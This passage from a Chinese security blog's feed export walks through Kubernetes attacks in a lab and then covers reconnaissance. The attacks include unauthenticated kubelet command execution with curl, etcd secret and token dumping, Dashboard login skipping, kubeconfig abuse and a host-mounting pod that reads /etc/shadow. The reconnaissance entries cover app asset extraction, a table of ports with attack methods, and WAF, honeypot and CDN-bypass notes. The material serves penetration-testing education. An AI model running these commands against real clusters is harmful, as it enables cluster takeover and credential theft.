class="line">kubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 get pods</span><br><span class="line">-连接执行pods</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 --namespace=default exec -it test02 bash</span><br></pre></td></tr></table></figure><p>操作与上面一样，写入反弹 shell</p><h3 id="3，攻击-10250-端口：kubelet-未授权访问"><a href="#3，攻击-10250-端口：kubelet-未授权访问" class="headerlink" title="3，攻击 10250 端口：kubelet 未授权访问"></a>3，攻击 10250 端口：kubelet 未授权访问</h3><p>与 API Server 类似，Kubelet 也运行着 API 服务，默认服务端口为 10250 和 10248</p><p>Kubelet 存在的风险主要也是未授权访问，如果 Kubelet 存在未授权访问，就可以控制所在节点的权限。</p><p>条件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/kubelet/config.yaml</span><br><span class="line">修改 authentication的anonyous为true  </span><br><span class="line">将authorization mode 修改为 AlwaysAllow</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-6.png"><br>访问页面时，存在此数据代表存在漏洞<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-7-1024x432.png"><br>利用执行命令，需要利用三个参数：</p><p>namespace，pod，container</p><p>访问 <a href="https://192.168.139.132:10250/runningpods">https://192.168.139.132:10250/runningpods</a></p><p>使用谷歌 FeHelper 插件可以将 json 数据更加直观的看到</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-8.png"><br>执行模板：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -k &quot;https://192.168.139.132:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&quot; -d &quot;cmd=id&quot;</span><br></pre></td></tr></table></figure><p>构造触发：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://192.168.139.132:10250/run/default/test02/test02</span><br><span class="line">curl -X POST -k &quot;https://192.168.139.132:10250/run/default/test02/test02&quot; -d &quot;cmd=id&quot;</span><br></pre></td></tr></table></figure><h2 id="二，etcd-未授权访问（利用条件苛刻）"><a href="#二，etcd-未授权访问（利用条件苛刻）" class="headerlink" title="二，etcd 未授权访问（利用条件苛刻）"></a>二，etcd 未授权访问（利用条件苛刻）</h2><p>默认通过证书认证，主要存放节点的数据，如一些 token 和证书。</p><p><strong>第一种</strong>：没有配置指定–client-cert-auth 参数打开证书校验，暴露在外 etcd 服务存在未授权访问风险。</p><ul><li>暴露外部可以访问，直接未授权访问获取 secrets 和 token 利用</li></ul><p><strong>第二种</strong>: 在打开证书校验选项后，通过本地 127.0.0.1:2379 可免认证访问 Etcd 服务，但通过其他地址访问要携带 cert 进行认证访问，一般配合 ssrf 或其他利用，较为鸡肋。</p><ul><li>只能本地访问，直接未授权访问获取 secrets 和 token 利用</li></ul><p><strong>第三种</strong>: 实战中在安装 k8s 默认的配置 2379 只会监听本地，如果访问没设置 0.0.0.0 暴露，那么也就意味着最多就是本地访问，不能公网访问，只能配合 ssrf 或其他。</p><ul><li>只能本地访问，利用 ssrf 或其他进行获取 secrets 和 token 利用</li></ul><p>复现利用:<br>暴露 etcd 未授权 -&gt; 获取 secrets&amp;token-&gt; 通过 token 访问 API-Server 接管</p><p>SSRF 解决限制访问 -&gt; 获取 secrets&amp;token-&gt; 通过 token 访问 API-Server 接管</p><p>V2&#x2F;v3 版本利用参考:<a href="https://www.cnblogs.com/qtzd/p/k8s">https://www.cnblogs.com/qtzd/p/k8s</a> etcd.html</p><p>启动:kubectl createf recommended.yaml</p><p>V2 版本利用:</p><p>直接访间 <a href="http://ip:2379/v2/keys/?recursive=true%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%89%80%E6%9C%89%E7%9A%84">http://ip:2379/v2/keys/?recursive=true，可以看到所有的</a> key-value 值。(secrets token)</p><p>V3 版本利用：</p><p>1、连接提交测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=192.168.139.136:23791 get / --prefix</span><br><span class="line">./etcdctl --endpoints=192.168.139.136:23791 put /testdir/testkey1&quot;Hello world1&quot;</span><br><span class="line">./etcdctl --endpoints=192.168139.136:23791 put /testdir/testkey2&quot;Hello world2&quot;</span><br><span class="line">./etcdctl --endpoints=192.168.139.136:23791 put /testdir/testkey3&quot;Hello world3&quot;</span><br></pre></td></tr></table></figure><p>2、获取 k8s 的 secrets:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=192.168.139.136:23791 get / --prefix--keys-only | grep /secrets/</span><br></pre></td></tr></table></figure><p>3、读取 service account token:.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=192.168.139.136:23791 get /--prefix --keys-only | grep /secrets/kube-system/clusterrole</span><br><span class="line">./etcdctl--endpoints-192.168.139.136:23791 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jdp5z</span><br></pre></td></tr></table></figure><p>4、通过 token 访问 API-Server，获取集群的权限:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --insecure-skip-tls-verify-s https://127.0.0.1:6443/ -token=&quot;ey...&quot; -n kube-system get pods</span><br></pre></td></tr></table></figure><h2 id="三，Dashboard-未授权访问"><a href="#三，Dashboard-未授权访问" class="headerlink" title="三，Dashboard 未授权访问"></a>三，Dashboard 未授权访问</h2><p>默认端口：8001<br>配置不当导致 dashboard 未授权访问，通过 dashboard 我们可以控制整个集群。kubernetes dashboard 的未授权其实分两种情况:<br>一种是在本身就存在着不需要登录的 http 接口，但接口本身并不会暴露出来，如接口被暴露在外，就会导致 dashboard 未授权。另外一种情况则是开发嫌登录麻烦，修改了配置文件，使得安全接口 https 的 dashboard 页面可以跳过登录。</p><p><strong>漏洞复现：</strong></p><p>用户开启 enable-skip-login 时可以在登录界面点击跳过登录进 dashboard*</p><p>Kubernetes-dashboard 绋定 cluster-admin (拥有管理集群的最高权限)</p><p>启动:kubectl createf recommended.yaml<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-9.png"></p><p>进入页面后，登录旁都 Skip, 可跳过登录直接进入</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-10-1024x254.png"></p><p>后逃逸方法与上面类似</p><h2 id="五，Configfile-鉴权文件泄漏"><a href="#五，Configfile-鉴权文件泄漏" class="headerlink" title="五，Configfile 鉴权文件泄漏"></a>五，Configfile 鉴权文件泄漏</h2><p>攻击者通过 webshell、Github 等拿到了 K8s 配置的 Config 文件，操作集群，从而接管所有容器。K8s configfile 作为 K8s 集群的管理凭证，其中包含有关 K8s 集群的详细信息 (API Server、登录凭证)。如果攻击者能够访问到此文件 (如办公网员工机器入侵、泄露到 Github 的代码等)，就可以直接通过 API Server 接管 K8s 集群，带来风险隐患。用户凭证保存在 kubeconfig 文件中，通过以下顺序来找到 kubeconfig 文件:</p><ul><li><p>1，如果提供了–kubeconfig 参数，就使用提供的 kubeconfig</p></li><li><p>2，文件如果没有提供–kubeconfig 参数，但设置了环境变量 SKUBECONFIG，则使用该环境变量提供的 kubeconfig 文件</p></li><li><p>3，如果以上两种情况都没有，kubectl 就使用默认的 kubeconfig 文件<br>~&#x2F;.kube&#x2F;config</p></li></ul><p>1，使用 config 文件连接:<br>kubectl -s <a href="https://192.168.139.130:6443/">https://192.168.139.130:6443/</a> –kubeconfig&#x3D;config –insecure-skip-tls-verify&#x3D;true get nodes</p><p>2、上传利用 test.yaml 创建 pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f test.yaml -n default--kubeconfig=config</span><br></pre></td></tr></table></figure><p>3，连接 pod 后进行容器挂载逃逸</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it test bash -n default--kubeconfig=config</span><br><span class="line">cd/mnt</span><br><span class="line">chroot . bash</span><br></pre></td></tr></table></figure><h2 id="六，Kubectl-Proxy-不安全配置"><a href="#六，Kubectl-Proxy-不安全配置" class="headerlink" title="六，Kubectl Proxy 不安全配置"></a>六，Kubectl Proxy 不安全配置</h2><p>当运维人员需要某个环境暴露端口或者 IP 时，会用到 Kubectl Proxy，使用 kubectl proxy 命令就可以使 API server 监听在本地的 xxxx 端口上</p><p>环境搭建:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl--insecure-skip-tls-verify proxy-accept-hosts=^.*$ --address=0.0.0.0 --port=8009</span><br><span class="line">//暴露8009端口</span><br></pre></td></tr></table></figure><h2 id="七，K8S-的污点横向移动"><a href="#七，K8S-的污点横向移动" class="headerlink" title="七，K8S 的污点横向移动"></a>七，K8S 的污点横向移动</h2><p>在 K8S 中，利用污点（Taint）进行横向移动渗透是指攻击者通过操纵或绕过集群中的污点和容忍（Toleration）机制，将恶意负载（Pod）调度到原本受保护的节点上，从而突破隔离并进一步渗透集群。污点和容忍是 K8S 的合法功能，设计目的是增强安全性。问题通常源于错误的权限分配（如过宽的 RBAC 策略）或不安全的容忍配置（如 Pod 容忍所有污点）。</p><p>设置污点:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置污点：</span><br><span class="line">kubectl taint nodes nodel xtz=valuel:NoSchedule</span><br></pre></td></tr></table></figure><p>通过以下命令查看节点上的污点设置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node &lt;节点名称&gt;</span><br><span class="line">Taints中 NoSchodule-为没有污点，none也没有污点</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-11-1024x475.png"><br>查看是否存在污点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node | grep &#x27;Taints&#x27;</span><br></pre></td></tr></table></figure><p><strong>容忍（Toleration）</strong></p><p>容忍是 Pod 上设置的属性，允许 Pod 被调度到带有特定污点的节点。</p><p>创建带有容忍参数的 Pod (必要时可以修改 Yaml 使 Pod 增加到特定的 Node 上去)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过<span class="built_in">cat</span>写入1.yaml配置文件</span></span><br><span class="line">cat &gt; 1.yaml &lt;&lt; EOF</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: control-master-15</span><br><span class="line">spec:</span><br><span class="line">  tolerations:</span><br><span class="line">    - key: node-role.kubernetes.io/master  //使Pod增加到特定的Node上去</span><br><span class="line">      operator: Exists</span><br><span class="line">      effect: NoSchedule</span><br><span class="line">  containers:</span><br><span class="line">    - name: control-master-15</span><br><span class="line">      image: ubuntu:18.04</span><br><span class="line">      command: [&quot;/bin/sleep&quot;, &quot;3650d&quot;]</span><br><span class="line">      volumeMounts:</span><br><span class="line">      - name: master</span><br><span class="line">        mountPath: /master</span><br><span class="line">  volumes:</span><br><span class="line">  - name: master</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br><span class="line">      type: Directory</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建Pod</span></span><br><span class="line">kubectl create -f control-master.yaml</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">部署情况</span></span><br><span class="line">kubectl get deploy -o wide</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Pod详情</span></span><br><span class="line">kubectl get pod -o wide</span><br></pre></td></tr></table></figure><p>获得 Master 控制端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec control-master-15 -it bash</span><br><span class="line">chroot /master bash</span><br><span class="line">ls -al</span><br><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集-3</title>
      <link href="/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3/"/>
      <url>/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集-3"></a>信息收集-3</h1><p><strong>APP 信息收集</strong></p><p>名称获取 APP 信息（爱企查 &#x2F; 小蓝本 &#x2F; 七麦 &#x2F; 点点）</p><p>1、爱企查知识产权</p><p>2、七麦 &amp; 点点查名称</p><p><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com</a></p><p><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com</a></p><p><a href="https://www.qimai.cn/">https://www.qimai.cn</a></p><p><a href="https://app.diandian.com/">https://app.diandian.com</a></p><p>通过获取 App 配置、数据包，去获取 url、api、osskey、js 等敏感信息。</p><p>1、资产信息 - IP 域名 网站 - 转到对应 Web 测试 接口测试 服务测试</p><p>2、泄露信息 - 配置 key 资源文件 – key（osskey 利用，邮件配置等）</p><p>3、代码信息 - java 代码安全问题 - 逆向相关</p><p><strong>APP 中收集资产</strong></p><p>1、抓包 - 动态表现</p><p>2、提取 - 静态表现 &amp; 动态调试</p><p>3、搜索 - 静态表现</p><p>1、抓包抓表现出来的数据</p><p>优点：没有误报</p><p>缺点：无法做到完整</p><p>2、反编译从源码中提取数据</p><p>优点：数据较为完整</p><p>缺点：有很多无用的资产</p><p>3、动态调试从表现中提取数据</p><p>优点：没有误报，解决不能抓包不能代理等情况</p><p>优点；搞逆向的人能看到实时的 app 调用链等</p><p>缺点：无法做到完整</p><p>例子：某 APP 打开无数据包，登录有数据包（反编译后未找到目标资产，抓包抓到了）</p><p>原因：那个登录界面是 APP 打包的资源，并没有对外发送数据</p><p><strong>静态分析：</strong></p><p>AppInfoScanner：</p><p>该产品适用于以 HW 行动 &#x2F; 红队 &#x2F; 渗透测试团队为场景的移动端（Android、iOS、WEB、H5、静态网站）信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态 WEB 站点中关键的资产信息并提供基本的信息输出，如：标题、域名、CDN、指纹信息、状态信息等。</p><p><a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></p><p>Android 相关基本操作：</p><p>对本地 APK 文件进行扫描</p><pre><code>python app.py android -i &lt;Your apk file&gt;  例：python app.py android -i C:\Users\Administrator\Desktop\Demo.apk</code></pre><p>iOS 相关基本操作：<br>对本地 IPA 文件进行扫描<br>    python app.py ios -i <Your ipa file><br>例:<br>    python app.py ios -i “C:\Users\Administrator\Desktop\Demo.ipa” </p><p>Web 相关基本操作：<br>对本地 WEB 站点进行扫描<br>    python app.py web -i <Your web file><br>例:<br>    python app.py web -i “C:\Users\Administrator\Desktop\Demo.html” </p><p><strong>移动安全框架（MobSF）</strong></p><p>移动安全框架（MobSF）是一个自动化、一体化的移动应用程序（Android&#x2F;iOS&#x2F;Windows）渗透测试、恶意软件分析和安全评估框架，能够执行静态和动态分析。MobSF 支持移动应用程序二进制文件（APK、XAPK、IPA 和 APPX）以及压缩的源代码，并提供 REST API，以便与 CI&#x2F;CD 或 DevSecOps 管道无缝集成。动态分析器帮助您执行运行时安全性评估和交互式检测测试。</p><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></p><p>所需环境：</p><p>本篇以 Windows 为例</p><p>1、安装 Git（示例版本 Git 2.35.1）</p><p>2、安装 Python 3.8-3.9（示例版本 Python 3.8.10）</p><p>3、安装 JDK 8+（示例版本 JDK 1.8.0_172）</p><p>4、安装 Microsoft Visual C++ Build Tools</p><p>5、安装 OpenSSL（non-light）</p><p>6、安装 wkhtmltopdf，并将包含 wkhtmltopdf 的二进制文件路径添加到</p><p>环境变量 PATH 里</p><p>运行： run.bat 127.0.0.1:8000<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-1-1024x476.png"></p><p><strong>动态抓包：</strong></p><p>使用抓包工具 Burp 等</p><p><strong>动态调试：</strong></p><p>Mobsf 工具中的动态调试 + 模拟器</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集-2</title>
      <link href="/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2/"/>
      <url>/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集-2"></a>信息收集-2</h1><p>常见端口：</p><table><thead><tr><th>端口</th><th>服务</th><th>渗透用途</th></tr></thead><tbody><tr><td>tcp 20,21</td><td>FTP</td><td>允许匿名的上传下载，爆破，嗅探，win 提权，远程执行 (proftpd1.3.5), 各类后门 (proftpd,vsftp 2.3.4)</td></tr><tr><td>tcp 22</td><td>SSH</td><td>可根据已搜集到的信息尝试爆破，v1 版本可中间人，ssh 隧道及内网代理转发，文件传输等等</td></tr><tr><td>tcp 23</td><td>Telnet</td><td>爆破，嗅探，一般常用于路由，交换登陆，可尝试弱口令</td></tr><tr><td>tcp 25</td><td>SMTP</td><td>邮件伪造，vrfy&#x2F;expn 查询邮件用户信息，可使用 smtp-user enum 工具来自动跑</td></tr><tr><td>tcp&#x2F;udp 53</td><td>DNS</td><td>允许区域传送，dns 劫持，缓存投毒，欺骗以及各种基于 dns 隧道的远控</td></tr><tr><td>tcp&#x2F;udp 69</td><td>TFTP</td><td>尝试下载目标及其的各类重要配置文件</td></tr><tr><td>tcp 80-89,443,8440-8450,8080-8089</td><td>各种常用的 Web 服务端口</td><td>可尝试经典的 topn,vpn,owa,webmail, 目标 oa, 各类 Java 控制台，各类服务器 Web 管理面板，各类 Web 中间件漏洞利用，各类 Web 框架漏洞利用等等……</td></tr><tr><td>tcp 110</td><td>POP3</td><td>可尝试爆破，嗅探</td></tr><tr><td>tcp 111,2049</td><td>NFS</td><td>权限配置不当</td></tr><tr><td>tcp 137,139,445</td><td>Samba</td><td>可尝试爆破以及 smb 自身的各种远程执行类漏洞利用，如，ms08-067,ms17-010, 嗅探等……</td></tr><tr><td>tcp 143</td><td>IMAP</td><td>可尝试爆破</td></tr><tr><td>udp 161</td><td>SNMP</td><td>爆破默认团队字符串，搜集目标内网信息</td></tr><tr><td>tcp 389</td><td>LDAP</td><td>ldap 注入，允许匿名访问，弱口令</td></tr><tr><td>tcp 512,513,514</td><td>Linux rexec</td><td>可爆破，rlogin 登陆</td></tr><tr><td>tcp 873</td><td>Rsync</td><td>匿名访问，文件上传</td></tr><tr><td>tcp 1194</td><td>OpenVPN</td><td>想办法钓 VPN 账号，进内网</td></tr><tr><td>tcp 1352</td><td>Lotus</td><td>弱口令，信息泄漏，爆破</td></tr><tr><td>tcp 1433</td><td>SQL Server</td><td>注入，提权，sa 弱口令，爆破</td></tr><tr><td>tcp 1521</td><td>Oracle</td><td>tns 爆破，注入，弹 shell</td></tr><tr><td>tcp 1500</td><td>ISPmanager</td><td>弱口令</td></tr><tr><td>tcp 1723</td><td>PPTP</td><td>爆破，想办法钓 VPN 账号，进内网</td></tr><tr><td>tcp 2082,2083</td><td>cPanel</td><td>弱口令</td></tr><tr><td>tcp 2181</td><td>ZooKeeper</td><td>未授权访问</td></tr><tr><td>tcp 2601,2604</td><td>Zebra</td><td>默认密码 zerbra</td></tr><tr><td>tcp 3128</td><td>Squid</td><td>弱口令</td></tr><tr><td>tcp 3312,3311</td><td>kangle</td><td>弱口令</td></tr><tr><td>tcp 3306</td><td>MySQL</td><td>注入，提权，爆破</td></tr><tr><td>tcp 3389</td><td>Windows rdp</td><td>shift 后门 [需要 03 以下的系统], 爆破，ms12-020</td></tr><tr><td>tcp 3690</td><td>SVN</td><td>svn 泄露，未授权访问</td></tr><tr><td>tcp 4848</td><td>GlassFish</td><td>弱口令</td></tr><tr><td>tcp 5000</td><td>Sybase&#x2F;DB2</td><td>爆破，注入</td></tr><tr><td>tcp 5432</td><td>PostgreSQL</td><td>爆破，注入，弱口令</td></tr><tr><td>tcp 5900,5901,5</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>tcp 5984</td><td>CouchDB</td><td>未授权导致的任意指令执行</td></tr><tr><td>tcp 6379</td><td>Redis</td><td>可尝试未授权访问，弱口令爆破</td></tr><tr><td>tcp 7001,7002</td><td>WebLogic</td><td>Java 反序列化，弱口令</td></tr><tr><td>tcp 8000</td><td>Ajenti</td><td>弱口令</td></tr><tr><td>tcp 8009</td><td>tomcat Ajp</td><td>Tomcat-Ajp 协议漏洞</td></tr><tr><td>tcp 8443</td><td>Plesk</td><td>弱口令</td></tr><tr><td>tcp 8069</td><td>Zabbix</td><td>远程执行，SQL 注入</td></tr><tr><td>tcp 8080-8089</td><td>Jenkins,JBoss</td><td>反序列化，控制台弱口令</td></tr><tr><td>tcp 9080-9081,9090</td><td>WebSphere</td><td>Java 反序列化 &#x2F; 弱口令</td></tr><tr><td>tcp 9200,9300</td><td>ElasticSearch</td><td>远程执行</td></tr><tr><td>tcp 11211</td><td>Memcached</td><td>未授权访问</td></tr><tr><td>tcp 27017,27018</td><td>MongoDB</td><td>爆破，未授权访问</td></tr><tr><td>tcp 50070,50030</td><td>Hadoop</td><td>默认端口未授权访问</td></tr></tbody></table><p>端口扫描：Nmap、Masscan、网络空间</p><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><p><strong>waf:</strong></p><p>云 WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等</p><p>硬件 WAF：绿盟、安恒、深信服、知道创宇等公司商业产品</p><p>软件 WAF：宝塔，安全狗、D 盾等</p><p>代码级 WAF：自己写的 waf 规则，防止出现注入等，一般是在代码里面写死的</p><p>遇到云 WAF，硬件 WAF 基本很难绕过，能绕过也没有什么可利用的东西</p><p><strong>蜜罐：</strong></p><p>低交互式蜜罐 ：通常是指与操作系统交互程度较低的蜜罐系统，仅开放一些简单的服务或端口，用来检测扫描和连接，这种容易被识别。</p><p>中交互式蜜罐 ：介于低交互式和高交互式之间，能够模拟操作系统更多的服务，让攻击者看起来更像一个真实的业务，从而对它发动攻击，这样蜜罐就能获取到更多有价值的信息。</p><p>高交互式 ：指的是与操作系统交互很高的蜜罐，它会提供一个更真实的环境，这样更容易吸引入侵者，有利于掌握新的攻击手法和类型，但同样也会存在隐患，会对真实网络造成攻击。</p><p>原理：<br>伪装与仿真：蜜罐模仿真实系统的服务和响应，让攻击者信以为真。</p><p>监控与日志：系统详尽记录所有与蜜罐的交互，包括网络包、系统日志、命令行操作等。</p><p>数据分析：利用自动化工具和人工分析来解析收集的数据，识别攻击模式和趋势。</p><p>1，国外蜜罐产品</p><p>一些常见的蜜罐产品包括：</p><ul><li>Cowrie: Cowrie 是一个基于 Python 的 SSH&#x2F;Telnet 蜜罐，旨在模拟 SSH 和 Telnet 服务，并记录攻击者的行为。</li><li>Honeyd: Honeyd 是一个虚拟蜜罐框架，可以模拟各种网络服务，并产生大量的虚假网络流量，以吸引攻击者。</li><li>Kippo: Kippo 是一个交互式 SSH 蜜罐，可以模拟 SSH 服务，并记录攻击者的输入和行为，以便分析和防御。</li><li>Glastopf: Glastopf 是一个 Web 应用蜜罐，可以模拟各种 Web 服务，并记录攻击者的 Web 请求和攻击行为。</li><li>Thug: Thug 是一个低交互式蜜罐，可以模拟 Web 浏览器，并记录恶意网站的行为和攻击代码。</li><li>DTK (Damn Vulnerable Linux)：一个故意设计漏洞的 Linux 发行版，常用于蜜罐部署和安全教育。</li><li>Conpot：专注于工业控制系统的蜜罐，模拟 SCADA 系统来检测针对工控网络的攻击。</li></ul><p>2，国内蜜罐产品</p><ul><li>知道创宇 - 创宇蜜罐：这是知道创宇公司推出的一款蜜罐产品，专门设计用于模拟真实环境，吸引并监测攻击者的行为，提供攻击预警与行为分析功能。</li><li>长亭科技 - 谛听：长亭科技开发的谛听蜜罐系统，同样着眼于高仿真度和高交互性，能够有效吸引攻击者并收集其攻击手法与意图。</li></ul><p>基本识别方法：</p><p>1.用 Nmap 等 Scan 工具，同一个机器同时开放很多 Port 的。</p><p>2.因为很多蜜罐都设置在相同或临近的网段。所以，同一个网段（e.g. ／24），很多机器都开放相同的 Port，回应相似的 Response。</p><p>3.去 Shodan／Censys 查</p><p><strong>CDN：</strong></p><ol><li><p>传统访问：用户访问域名–&gt; 解析服务器 IP–&gt; 访问目标主机</p></li><li><p>普通 CDN：用户访问域名–&gt;CDN 节点–&gt; 真实服务器 IP–&gt; 访问目标主机</p></li><li><p>带 WAF 的 CDN：用户访问域名–&gt;CDN 节点（WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机</p></li></ol><p>#CDN 配置及绕过：</p><p>配置 1：加速域名 - 需要启用加速的域名</p><p>配置 2：加速区域 - 需要启用加速的地区</p><p>配置 3：加速类型 - 需要启用加速的资源</p><p>#CDN 的判定：</p><p>超级 Ping：<a href="https://17ce.com/">https://17ce.com/</a></p><p>超级 Ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p>各地 ping（出现多个 ip 存在 CDN）</p><p>后置：绑定 HOSTS 访问解析</p><p>CDN 绕过：</p><p>1，子域名访问真实 ip（与加速配置有关），国外访问（加速区域没有配置全球访问）</p><p>2，漏洞利用，比如 RCE，SSRF</p><p>3，邮件系统：让它主动给你发送邮件</p><p>部署架构的邮件服务系统主动向用户发送邮件的话，邮件头部的源码会包含邮件服务系统的真实 ip</p><p>对方使用第三方邮件发送就不存在 ip 比如：@126.com，@qq.com 等</p><p>常见的邮箱出发点：</p><p>1，RSS 订阅</p><p>2，邮箱注册，激活处</p><p>3，邮箱找回密码处</p><p>4，产品更新的邮件推送</p><p>5，某业务执行后发送的邮件通知</p><p>6，员工邮箱，邮箱管理系统平台等入口的忘记密码</p><p>你给未知的邮箱发送：（需要自己的邮箱服务器不能第三方）</p><p>网站查询：</p><p><a href="https://get-site-ip.com/(%E5%8F%82%E8%80%83)">https://get-site-ip.com/(参考)</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集-1</title>
      <link href="/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/"/>
      <url>/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/</url>
      
